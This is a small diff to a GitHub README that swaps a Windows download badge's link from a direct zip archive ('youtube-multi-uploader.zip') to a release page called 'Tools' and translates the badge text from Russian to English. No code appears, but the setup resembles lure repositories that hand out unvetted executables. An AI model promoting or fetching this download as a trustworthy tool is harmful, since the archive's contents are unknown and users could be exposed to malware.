@@ -11,8 +11,8 @@
 <img width="1728" height="623" alt="Gemini_Generated_Image_e3lh08e3lh08e3lh" src="https://github.com/user-attachments/assets/7de59251-4ca7-443a-b5e5-cee6447fe326" />
 
 <p>
-  <a href="https://github.com/InfernoClear77320/InfernoClear77320/releases/latest/download/youtube-multi-uploader.zip">
-    <img src="https://img.shields.io/badge/%D0%A1%D0%BA%D0%B0%D1%87%D0%B0%D1%82%D1%8C%20%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D1%83-5865F2?style=for-the-badge&logo=windows&logoColor=white" alt="Download the program">
+  <a href="https://github.com/InfernoClear77320/InfernoClear77320/releases/tag/Tools">
+    <img src="https://img.shields.io/badge/Download%20the%20program-5865F2?style=for-the-badge&logo=windows&logoColor=white" alt="Download the program">
   </a>
 </p>
 
